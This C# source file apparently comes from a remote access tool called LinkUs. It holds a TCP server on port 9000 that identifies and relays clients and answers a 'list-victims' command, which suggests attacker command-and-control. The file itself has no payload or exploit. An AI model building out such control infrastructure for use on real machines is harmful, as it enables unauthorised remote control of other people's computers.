using System;
using System.Linq;
using System.Net;
using System.Text;
using LinkUs.Core;

namespace LinkUs
{
    class Program
    {
        static void Main(string[] args)
        {
            var connector = new Connector();
            connector.PackageReceived += package => {
                WriteLine($"{package}");
            };
            connector.ClientConnected += clientId => {
                WriteLine($"Client '{clientId}' connected.");
            };
            connector.ClientDisconnected += clientId => {
                WriteLine($"Client '{clientId}' disconnected.");
            };

            var server = new Server(connector);

            server.Start(new IPEndPoint(IPAddress.Any, 9000));
            WriteLine("* Server started. Waiting for incoming connections.");
            while (Console.ReadLine() != "exit") { }
            WriteLine("* Closing connections...");
            server.Shutdown();
            WriteLine("* Server shutdown.");
        }

        private static void WriteLine(string value)
        {
            Console.WriteLine($"[{DateTime.Now}] {value}");
        }
    }

    public class Server
    {
        private static readonly UTF8Encoding Encoding = new UTF8Encoding();
        private readonly Connector _connector;

        // ----- Constructor
        public Server(Connector connector)
        {
            if (connector == null) throw new ArgumentNullException(nameof(connector));
            _connector = connector;
            _connector.PackageReceived += ConnectorOnPackageReceived;
            _connector.ClientConnected += ConnectorOnClientConnected;
            _connector.ClientDisconnected += ConnectorOnClientDisconnected;
        }
        // ----- Public methods
        public void Start(IPEndPoint endPoint)
        {
            _connector.Listen(endPoint);
        }
        public void Shutdown()
        {
            _connector.Close();
        }

        // ----- Event callbacks
        private void ConnectorOnClientConnected(ClientId clientId)
        {
            var package = new Package(ClientId.Server, clientId, Encoding.GetBytes("identification"));
            _connector.SendDataAsync(package);
        }
        private void ConnectorOnClientDisconnected(ClientId clientId) { }
        private void ConnectorOnPackageReceived(Package package)
        {
            if (Equals(package.Destination, ClientId.Server)) {
                var commandLine = Encoding.GetString(package.Content);
                if (commandLine == "list-victims") {
                    var clients = _connector.GetClients();
                    var value = string.Join(Environment.NewLine, clients.Select(x => x.ToString()));
                    var packageResponse = package.CreateResponsePackage(Encoding.GetBytes(value));
                    _connector.SendDataAsync(packageResponse);
                }
                else {
                    var responsePackage = package.CreateResponsePackage(Encoding.GetBytes("Invalid command"));
                    _connector.SendDataAsync(responsePackage);
                }
            }
            else {
                _connector.SendDataAsync(package);
            }
        }
    }
}